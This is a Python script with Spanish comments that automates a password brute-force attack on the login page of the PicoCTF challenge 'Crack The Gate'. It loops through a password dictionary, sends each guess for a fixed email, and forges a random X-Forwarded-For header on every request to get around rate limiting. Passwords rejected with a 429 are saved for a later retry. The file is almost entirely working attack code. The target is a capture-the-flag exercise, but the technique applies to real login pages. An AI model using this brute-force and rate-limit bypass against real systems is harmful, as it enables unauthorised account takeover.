import os, random, requests, argparse

def create_false_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def cracker(url, headers, data):
    # Realizamos la petición POST con la IP falsificada y la contraseña en cuestión
    r = requests.post(url=url, headers=headers, data=data)

    if r.status_code == 429:
        return "429"
    try:
        datos = r.json()
        success = datos.get("success", "No especificada")
        if success == True: return True
        return False
    except requests.exceptions.JSONDecodeError:
        pass
    except requests.exceptions.ProxyError:
        print('[-] Error con el proxy.')
        exit()

def anadir_passwords_fallidos(password):
    with open('Contraseñas fallidas.txt', 'a') as f:
        f.write(password + "\n")

def main(url, passwords):
    #Normalizamos la URL para evitar errores
    check_url = lambda url: url if url[-1] != '/' else url[:-1]
    url = check_url(url)
    url = url + '/login'

    # Verifcamos que el diccionario de contraseñas exista
    script_dir = os.path.dirname(os.path.abspath(__file__))
    if os.path.sep not in passwords:
        ruta_final = os.path.join(script_dir, passwords)
    else:
        ruta_final = passwords
    if not os.path.exists(ruta_final):
        print(f'El diccionario no se encuentra en: {ruta_final}')
        exit()

    # Creamos la lista con las contraseñas
    with open(ruta_final, 'r') as p:
        for password in p:
            password = password.strip()
            ip = create_false_ip()
            print(f'[~] Probando contraseña: {password}, con la IP: {ip}')
            header = {
                "X-Forwarded-For":ip
            }
            data = {
                "email":"ctf-player@picoctf.org",
                "password":password
            }
            
            # Ejecutamos el Cracker
            resultado = cracker(url, header, data)
            if resultado:
                print(f'[+] Éxito!!! La contraseña correcta es: {password}')
                exit()
            if resultado == "429":
                print(f'[!] Se ha dado un error 429 (Too Many Requests)!!! con la IP: {ip} y la contraseña: {password}.\nAlmacenando la contraseña en un nuevo diccionario para probar después.')
                anadir_passwords_fallidos(password)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Herramienta para automatizar el ataque de fuerza bruta al reto "Crack The Gate" de PicoCTF, bypaseando el Rate Limit impuesto.')
    parser.add_argument('-t', '--target', required=True, 
                        help='Especificar la url objetivo. Ej: https://www.example.com')
    parser.add_argument('-p', '--passwords', required=True,
                        help='Diccionario an utilizar.')
    args = parser.parse_args()

    main(args.target,
        args.passwords)
